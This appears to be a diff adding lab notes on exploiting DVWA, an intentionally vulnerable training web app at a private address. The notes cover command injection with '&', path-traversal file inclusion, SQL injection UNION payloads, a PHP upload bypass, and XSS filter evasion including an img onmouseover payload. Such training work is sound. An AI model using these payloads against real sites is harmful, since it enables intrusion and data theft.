@@ -1,0 +1,62 @@
+Command line execution:
+Addin an '&'' (single ampersand) to the end of a command will direct the shell to reun the command in the background. That way, we can append commands to the end of the "ping" command by putting '&'s between them. Using the ls command, for example, shows us the files present in the directory. Those are:
+help
+index.php
+source
+Using the -l option:
+drwxr-xr-x 2 root root 4096 Apr 26  2011 help
+-rwxr-xr-x 1 root root 1541 Apr 26  2011 index.php
+drwxr-xr-x 2 root root 4096 Apr 26  2011 source
+We can also list all files under the "help" and "source" directories, and we cant print them to the screen.
+
+Using 'ls -l ../' we can also list what's under the parent directory of the one we're in. 
+
+drwxr-xr-x 4 root root 4096 Apr 26  2011 brute
+drwxr-xr-x 4 root root 4096 Nov  3 09:43 csrf
+drwxr-xr-x 4 root root 4096 Apr 26  2011 exec
+drwxr-xr-x 4 root root 4096 Apr 26  2011 fi
+drwxr-xr-x 4 root root 4096 Apr 26  2011 sqli
+drwxr-xr-x 4 root root 4096 Apr 26  2011 sqli_blind
+drwxr-xr-x 4 root root 4096 Apr 26  2011 upload
+-rwxr-xr-x 1 root root  542 Apr 26  2011 view_help.php
+-rwxr-xr-x 1 root root 1364 Nov  3 09:40 view_source.php
+drwxr-xr-x 4 root root 4096 Apr 26  2011 xss_r
+drwxr-xr-x 4 root root 4096 Apr 26  2011 xss_s
+
+
+We can algo use the pwd command. This shows us the directory we are in:
+/srv/apachejail/websec/medium/vulnerabilities/exec
+
+
+=======================================================================================
+File Inclusion:
+
+With help of the command execution vulnerability, we can look around and search for php files. We can do the following, for example:
+http://10.0.23.21/vulnerabilities/fi/?page=../upload/index.php
+And the "upload" index will show up.
+
+
+=======================================================================================
+SQL injection:
+http://10.0.23.21/vulnerabilities/sqli_blind/?id=1%20or%202&Submit=Submit#
+2 UNION SELECT first_name, last_name FROM users WHERE user_id = 1
+
+2 UNION SELECT @@version
+
+
+
+=======================================================================================
+Unrestricted Upload:
+
+Using the Burp Suite, we can upload files that aren't jpg or png. For example, we can upload a php file and open it on the browser. 
+
+=======================================================================================
+XSS reflected
+
+Because the page doesn't allow us to put code with the tag <script> we have to find another way around this. One possibility, is to use "script src" for example, and have a javascrpt script saved somewhere. We can also write <Script> (with caps lock).
+
+=======================================================================================
+XSS stored
+
+The message field goes through various functions that stop us from putting some script there, but the name field doesn't. The only issue is that the name field is too small. We can go around this by inspecting the page, and changing "maxlenght" to something that suit us. 
+ <img src="https://bit.ly/2z738CO" onmouseover="alert('uwu');">
